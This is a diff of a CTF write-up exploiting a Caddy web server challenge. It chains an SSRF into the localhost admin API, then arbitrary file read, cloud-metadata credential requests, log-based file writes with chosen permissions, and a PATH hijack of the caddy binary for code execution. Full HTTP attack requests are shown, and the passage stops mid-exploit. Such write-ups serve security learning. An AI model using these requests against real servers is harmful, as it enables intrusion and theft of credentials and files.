@@ -5,6 +5,7 @@ Description of the task:
 ```
 Nowadays, some kind of connection transitivity is often required. We're quite new to this market, would you mind to check our MVP? 
 ```
+
 We are given a Dockerfile, Caddyfile, compose file, `flag.sh` and `index.html` with static content. We can see that we are using the last version of the Caddy server in the docker container. 
 ```Docker
 FROM caddy:2.10-alpine
@@ -19,6 +20,7 @@ COPY flag.sh /
 RUN chmod 0000 /flag.sh
 CMD while true; do sh -c 'caddy run --config /app/Caddyfile'; done
 ```
+
 Also, we have 2 strange commands in the Docker file: chmod 000 and an infinite loop of running caddy by sh. As the capability of CAP_DAC_OVERRIDE is dropped in the compose file, we can't read the file with the flag even as root. So we have to achieve RCE or change permissions of the file.
 ```
 services:
@@ -29,7 +31,9 @@ services:
     cap_drop:
             - CAP_DAC_OVERRIDE
 ```
+
 By the way, what is caddy? Caddy is a modern, open-source web server platform designed to be simple, secure, and fast. Its standout features include automatic HTTPS by default (obtaining and renewing certificates) and a user-friendly configuration using the Caddyfile. It is used to host static files and as a reverse proxy, like Nginx. The author gives the next Caddyfile:
+
 ```
 :80 {
     @stripHostPort path_regexp stripHostPort ^\/([^\/]+?)(?::(\d+))?(\/.*)?$
@@ -53,6 +57,7 @@ By the way, what is caddy? Caddy is a modern, open-source web server platform de
     }
 }
 ```
+
 We have a web server on port 80, which has 2 handles. The second part of the config is not interesting; it just serves files from the current directory (for example, index.html). 
 The first part is reverse_proxy, which takes 3 arguments: target host, port and path. Next, the server adds some headers and forwards the HTTP request to the target port. This is arbitrary SSRF with full output. And also, we can use any HTTP method and request body; they will also be forwarded. This is a very strong primitive to start with.
 
@@ -67,6 +72,7 @@ tcp        0      0 127.0.0.1:2019          0.0.0.0:*               LISTEN
 tcp        0      0 :::80                   :::*                    LISTEN
 ```
 We have some strange port 2019, which is accessible only from localhost and accepts HTTP connections. There is a metric endpoint (go pprof), which is accessible by SSRF `http://[container]/127.0.0.1:2019/debug/pprof/heap?debug=1`, but it doesn't give enough information for us. By opening the documentation, we can see that there is a special [admin API](https://caddyserver.com/docs/api). We can try to access it with SSRF, and it works. The API accepts proxy requests with X-forward. We can see the current configuration with the next request `http://[container]/127.0.0.1:2019/config/` and see the current configuration:
+
 ```http
 HTTP/1.1 200 OK
 Content-Length: 1006
@@ -83,6 +89,7 @@ We can access the admin API and send any POST request, so the next step is to ac
 events.handlers.exec implements an event handler that runs a command/program. By default, commands are run in the background so as to not block the Caddy goroutine.
 ```
 So we have a very easy way to RCE. Let's rewrite the current configuration:
+
 ```http
 POST /127.0.0.1:2019/load HTTP/1.1
 Host: [container]
@@ -128,6 +135,7 @@ Content-Length: 613
   }
 }
 ```
+
 And we got an error; that module is unknown. Oops, this will not be that easy. Why can't we use this module? Because it's not standard and has to be installed additionally. 
 ```http
 HTTP/1.1 400 Bad Request
@@ -137,6 +145,7 @@ Date: Sat, 24 May 2025 17:46:01 GMT
 Via: 1.1 Caddy
 {"error":"loading config: loading new config: loading http app module: provision http: server exploit: setting up route handlers: route 0: loading handler modules: position 0: loading module 'exec': unknown module: http.handlers.exec"}
 ```
+
 The next step is to analyse only standard modules to create something interesting. We can see all modules in [the official documentation](https://caddyserver.com/docs/modules/).### SSRF to Cloud meta server
 But before we continue, I had one more idea. The service is running in the cloud, so can we use SSRF to access the cloud meta server:
 ```http
@@ -154,6 +163,7 @@ Sec-Fetch-User: ?1
 Priority: u=0, i
 Te: trailers
 ```
+
 But we can't access it:
 ```http
 HTTP/2 400 Bad Request
@@ -166,12 +176,14 @@ Via: 1.1 Caddy
 X-Content-Type-Options: nosniff
 Proxied requests are not allowed
 ```
+
 Caddy adds 3 headers, which are blocked by the cloud API:
 ```http
 X-Forwarded-For: 192.168.65.1
 X-Forwarded-Host: [container]
 X-Forwarded-Proto: http
 ```
+
 We have access to the admin API, so we can just drop them by changing the current configuration:
 ```
 POST /127.0.0.1:2019/load HTTP/2
@@ -192,7 +204,9 @@ Content-Type: application/json
 Content-Length: 1080
 {"apps":{"http":{"servers":{"srv0":{"listen":[":80"],"routes":[{"handle":[{"defaults":["{http.regexp.stripHostPort.2}"],"destinations":["{targetPort}"],"handler":"map","mappings":[{"outputs":[80]}],"source":"{http.regexp.stripHostPort.2}"},{"defaults":["{http.regexp.stripHostPort.3}"],"destinations":["{targetPath}"],"handler":"map","mappings":[{"outputs":["/"]}],"source":"{http.regexp.stripHostPort.3}"}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"group":"group0","handle":[{"handler":"rewrite","uri":"{targetPath}"}]},{"handle":[{"handler":"reverse_proxy","headers":{"request":{"set":{"Host":["{http.regexp.stripHostPort.1}:{targetPort}"]},"delete":["X-Forwarded-For","Via","X-Forwarded-Host","X-Forwarded-Proto"]}},"upstreams":[{"dial":"{http.regexp.stripHostPort.1}:{targetPort}"}]}]}]}],"match":[{"path_regexp":{"name":"stripHostPort","pattern":"^\\/([^\\/]+?)(?::(\\d+))?(\\/.*)?$"}}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"handle":[{"handler":"vars","root":"/"},{"handler":"file_server","hide":["/app/Caddyfile"]}]}]}]}]}}}}}
 ```
+
 Finally, we have full SSRF and can access the cloud API. I tried to access the security credentials of the container  `https://<uuid>.kit.sasc.tf/169.254.169.254/latest/meta-data/iam/security-credentials/default`, but there is no token for this container.
+
 ```http
 HTTP/2 400 Bad Request
 Server: ycalb
@@ -202,7 +216,9 @@ Content-Length: 44
 Etag: aeb61aa4382bbd78d26265397eacff49
 Via: 1.1 Caddy
 Token is disabled for "fv4em6ihrthp2tbj12l3"
-```### File read
+```
+### File read
+
 Okay, let's try to just read the flag. We are root inside the container, so we can read almost every file. The next request creates file_server at `/` directory.
 ```http
 POST /127.0.0.1:2019/load HTTP/1.1
@@ -243,6 +259,7 @@ Content-Length: 510
 ```
 
 And we can read files with simple requests: `http://[container]/etc/passwd`
+
 ```http
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -270,7 +287,9 @@ ntp:x:123:123:NTP:/var/empty:/sbin/nologin
 guest:x:405:100:guest:/dev/null:/sbin/nologin
 nobody:x:65534:65534:nobody:/:/sbin/nologin
 ```
+
 If we try to read the flag by accessing `http://[container]/flag.sh`, we will get a 403 error. This is because root can't read the file. We need some way to change the permissions of the file.I cloned the Git repository with the source code of Caddy and searched for `os.Chmod`. The first usage in `caddy/listeners.go`, but it's used only for Unix sockets:
+
 ```go
 if IsUnixNetwork(na.Network) {
 isAbstractUnixSocket := strings.HasPrefix(address, "@")
@@ -282,7 +301,9 @@ return nil, fmt.Errorf("unable to set permissions (%s) on %s: %v", unixFileMode,
         }
     }
 ```
+
 The second usage in `caddy/modules/logging/filewriter.go`, which is used for a logger. We can search for mode in the documentation and get [a description](https://caddyserver.com/docs/json/logging/logs/writer/file/mode/) of the permissions mode of the file. 
+
 ```go
 file, err := os.OpenFile(fw.Filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, modeIfCreating)
 if err != nil {
@@ -305,6 +326,7 @@ return nil, err
         }
     }
 ```
+
 That is what we needed. Let's try to rewrite the mode of the flag.
 ```http
 POST /127.0.0.1:2019/load HTTP/1.1
@@ -357,6 +379,7 @@ Content-Length: 633
   }
 }
 ```
+
 But we again get the error of opening the file. The server opens the file before changing the permissions. We have to try harder.
 ```http
 HTTP/1.1 400 Bad Request
@@ -366,11 +389,14 @@ Date: Sat, 24 May 2025 19:16:22 GMT
 Via: 1.1 Caddy
 {"error":"loading config: loading new config: setting up default log: opening log writer using \u0026logging.FileWriter{Filename:\"/flag.sh\", Mode:0x1ff, Roll:(*bool)(nil), RollSizeMB:0, RollCompress:(*bool)(nil), RollLocalTime:false, RollKeep:0, RollKeepDays:0}: open /flag.sh: permission denied"}
 ```
+
 ### File write with arbitrary permissions
+
 Now we have a very strong primitive: arbitrary file write with arbitrary permissions. What do we want to rewrite? The container doesn't have cron jobs or other processes. The obvious way is LD_PRELOAD, but we potentially can write only printable characters. As we can see in the Docker file, 2 files are used in an infinite loop: sh and caddy. Let's try to rewrite them:
 For sh, we go error: `open /bin/sh: text file busy`, because the file is used constantly. And for caddy error is `open /usr/bin/caddy: permission denied`, because the user with ID 1001 is the owner of this binary (not root).
 At this time I had to sleep and generate new ideas. So we have file write; what is a way to hijack the execution of command? The key idea is that Docker commands contain relative paths of binaries, not absolute! We can check the `$PATH` variable to find out the search order of binary files:
 `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`. The path `/usr/sbin/` exists in the container and is used before `/usr/bin`. If we write to `/usr/sbin/caddy`, then this file will be used instead of the original binary. Let's create a log file with our logs:
+
 ```http
 POST /127.0.0.1:2019/load HTTP/1.1
 Host: [container]
@@ -397,7 +423,9 @@ Content-Length: 1658
         },"level": "error",
         "encoder": {
 ...
-```The next problem is that the server has to be stopped. How can we stop the current server? The basic idea of a crash is good, but there is an easy way. We have access to the admin API, which can be used to just stop the current server. So we just send a request to this API [/stop](https://caddyserver.com/docs/api#post-stop) and the server will be restarted. After restart, we can see errors of running our file with sh:
+```
+
+The next problem is that the server has to be stopped. How can we stop the current server? The basic idea of a crash is good, but there is an easy way. We have access to the admin API, which can be used to just stop the current server. So we just send a request to this API [/stop](https://caddyserver.com/docs/api#post-stop) and the server will be restarted. After restart, we can see errors of running our file with sh:
 ```
 echo: not found/sbin/caddy: line 2:
 caddy-1  | /usr/sbin/caddy: line 1: 2025/05/25: not found
@@ -410,7 +438,9 @@ caddy-1  | /usr/sbin/caddy: line 1: 2025/05/25: not found
 echo: not found/sbin/caddy: line 2:
 caddy-1  | /usr/sbin/caddy: line 1: 2025/05/25: not found
 ```
+
 ### File write with arbitrary permissions and controlled content
+
 Now we have the ability to execute our file by sh. The main problem is that the log file has a strict format. We have spent some time to analyse documentation and found a way to create valid sh scripts. The default format is JSON, but we can change it to cleartext. This request will create an executable log file with only errors because we don't need starting and info-level messages:
 ```http
 POST /127.0.0.1:2019/load HTTP/1.1
